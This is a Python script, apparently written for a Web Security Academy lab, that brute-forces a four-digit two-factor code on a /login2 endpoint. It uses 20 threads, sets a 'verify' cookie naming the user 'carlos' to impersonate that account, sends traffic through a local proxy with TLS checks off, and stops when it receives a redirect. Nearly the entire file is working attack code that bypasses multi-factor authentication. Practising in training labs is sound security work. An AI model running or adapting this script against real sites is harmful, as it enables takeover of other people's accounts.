import sys
import requests
import urllib3
import urllib
import threading


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {'https': 'https://127.0.0.1:8080'}
cookies = {'session':'bxGYWmmw3GMFVMMjv31Lf64do1geDfam', 'verify':'carlos'}

def brute(num1,num2):
    for x in range(num1,num2):
        mfa = ''
        number = str(x)
        if(len(number) < 4):
            zeros = '0' * (4 - len(number))
            mfa = zeros + number
        else:
            mfa = number
        #print(mfa)        
        r = requests.post('https://acb71f331f1f04b180d363070038005b.web-security-academy.net/login2', cookies=cookies, data = {'mfa-code': mfa}, verify=False, proxies=proxy, allow_redirects=False)
        print(mfa, " = ", r.status_code)
        if r.status_code == 302:
            print("==========================================================================================" + mfa + "=============================================")
            exit()

    
def main():
    thread_list = []
    for i in range(0000, 10000, 500):
        t = threading.Thread(target=brute, args=(i,i+500))
        thread_list.append(t)
       
    
    for thread in thread_list:
        thread.start()

if __name__ == "__main__":
    main()
